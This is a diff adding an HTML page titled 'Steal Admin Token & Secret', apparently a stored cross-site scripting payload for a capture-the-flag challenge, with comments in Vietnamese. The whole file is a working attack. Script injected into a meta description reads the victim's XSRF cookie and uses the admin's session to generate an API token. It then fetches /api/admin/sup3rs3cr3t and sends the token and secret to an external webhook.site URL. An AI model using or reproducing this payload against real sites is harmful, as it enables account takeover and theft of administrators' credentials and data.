@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Steal Admin Token & Secret</title>
+  <meta name="description" content='<script>
+    (async function () {
+      const webhook = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
+
+      // Lấy CSRF token từ cookie
+      let xsrf = null;
+      document.cookie.split(";").forEach(c => {
+        c = c.trim();
+        if (c.startsWith("XSRF-TOKEN=")) {
+          xsrf = decodeURIComponent(c.substring("XSRF-TOKEN=".length));
+        }
+      });
+
+      if (!xsrf) return;
+
+      try {
+        // Bước 1: Lấy API token bằng cách gửi POST tới /generate-token
+        const tokenRes = await fetch("/generate-token", {
+          method: "POST",
+          headers: {
+            "Accept": "application/json",
+            "X-XSRF-TOKEN": xsrf,
+            "X-Requested-With": "XMLHttpRequest"
+          },
+          credentials: "include" // Gửi cookie admin
+        });
+
+        const tokenData = await tokenRes.json();
+
+        if (!tokenData.token) return;
+
+        const token = tokenData.token;
+
+        // Gửi token về webhook (tùy chọn)
+        new Image().src = `${webhook}?stage=got_token&token=${encodeURIComponent(token)}`;
+
+        // Bước 2: Dùng token gọi GET /api/admin/sup3rs3cr3t
+        const secretRes = await fetch("/api/admin/sup3rs3cr3t", {
+          method: "GET",
+          headers: {
+            "Accept": "application/json",
+            "Authorization": "Bearer " + token,
+            "X-Requested-With": "XMLHttpRequest"
+          },
+          credentials: "include"
+        });
+
+        const secretData = await secretRes.json();
+
+        // Gửi secret về webhook
+        new Image().src = `${webhook}?stage=got_secret&data=${encodeURIComponent(JSON.stringify(secretData))}`;
+
+      } catch (e) {
+        new Image().src = `${webhook}?stage=error&msg=${encodeURIComponent(e.toString())}`;
+      }
+    })();
+  </script>'>
+</head>
+<body>
+  <h1>Admin Page</h1>
+</body>
+</html>
